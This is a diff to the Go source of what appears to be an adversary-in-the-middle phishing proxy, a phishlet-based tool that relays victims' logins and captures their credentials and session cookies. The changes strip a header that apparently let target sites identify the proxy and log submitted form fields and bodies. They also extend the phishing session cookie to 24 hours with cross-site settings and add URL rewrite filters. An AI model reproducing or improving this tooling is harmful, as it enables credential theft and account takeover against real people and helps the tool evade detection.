@@ -177,7 +177,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
 			lure_url := req_url
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
@@ -406,10 +405,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// redirect for unauthorized requests
 				if ps.SessionId == "" && p.handleSession(req.Host) {
 					if !req_ok {
+						log.Warning("redirect for unauthorized requests")
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -565,6 +564,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
 							o_url.Host = r_host
 							req.Header.Set("Origin", o_url.String())
+
+							log.Debug("Origin %s replaced with %s", origin, o_url.String())
 						}
 					}
 				}
@@ -587,17 +588,29 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
 							o_url.Host = r_host
 							req.Header.Set("Referer", o_url.String())
+
+							log.Debug("Referer %s replaced with %s", referer, o_url.String())
 						}
 					}
 				}
 
 				// patch GET query params with original domains
 				if pl != nil {
+
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+
+								for _, query := range pl.urlfilters {
+									if qs[gp][i] == query.search {
+										qs[gp][i] = query.replace
+
+										log.Info("URL replace: changed from %s to %s", query.search, query.replace)
+									}
+								}
+
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
@@ -606,7 +619,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -615,8 +628,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
 
-						log.Debug("POST: %s", req.URL.Path)
-						log.Debug("POST body = %s", body)
+						log.Debug("Method %s: %s", req.Method, req.URL.Path)
+						log.Debug("Body: %s", body)
 
 						contentType := req.Header.Get("Content-type")
 
@@ -663,7 +676,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						} else if form_re.MatchString(contentType) {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
-								log.Debug("POST: %s", req.URL.Path)
+								log.Debug("Method %s: %s", req.Method, req.URL.Path)
 
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
@@ -711,7 +724,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								for k, v := range req.PostForm {
 									if len(v) > 0 {
-										log.Debug("POST %s = %s", k, v[0])
+										log.Debug("FORM POST %s = %s", k, v[0])
 									}
 								}
 
@@ -789,11 +802,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ps.SessionId != "" {
 				if ps.Created {
 					ck = &http.Cookie{
-						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
-						Value:   ps.SessionId,
-						Path:    "/",
-						Domain:  p.cfg.GetBaseDomain(),
-						Expires: time.Now().Add(60 * time.Minute),
+						Name:     getSessionCookieName(ps.PhishletName, p.cookieName),
+						Value:    ps.SessionId,
+						Path:     "/",
+						Domain:   p.cfg.GetBaseDomain(),
+						Expires:  time.Now().Add(24 * 60 * time.Minute),
+						Secure:   true,
+						SameSite: http.SameSiteNoneMode,
 					}
 				}
 			}
@@ -802,7 +817,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if allow_origin != "" && allow_origin != "*" {
 				if u, err := url.Parse(allow_origin); err == nil {
 					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+						ac_allow_origin := u.Scheme + "://" + o_host
+						log.Debug("Header 'Access-Control-Allow-Origin' replaced %s with %s", allow_origin, ac_allow_origin)
+						resp.Header.Set("Access-Control-Allow-Origin", ac_allow_origin)
 					}
 				} else {
 					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
@@ -964,6 +981,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
+			log.Debug("Response mime is [%s]", mime)
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
 					if p.cfg.IsSiteEnabled(site) {
@@ -1029,6 +1047,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							for _, ph := range pl.proxyHosts {
 								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
 									if ph.auto_filter {
+										log.Debug("Auto filter host [%s] is enabled", req_hostname)
 										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
 									}
 								}
